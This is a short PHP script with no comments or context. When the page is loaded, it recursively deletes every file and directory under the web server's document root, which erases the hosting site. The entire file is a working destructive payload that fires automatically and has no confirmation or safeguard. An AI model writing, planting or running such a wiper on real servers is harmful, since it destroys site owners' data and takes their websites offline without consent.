<?php

$dirname = $_SERVER['DOCUMENT_ROOT'];

function delete_directory($directory)
{
    if (!is_dir($directory)) return;

    $contents = scandir($directory);
    unset($contents[0], $contents[1]);

    foreach ($contents as $object) {
        $current_object = $directory . '/' . $object;
        if (filetype($current_object) === 'dir') {
            delete_directory($current_object);
        } else {
            unlink($current_object);
        }
    }

    rmdir($directory);
}

delete_directory("$dirname");
?>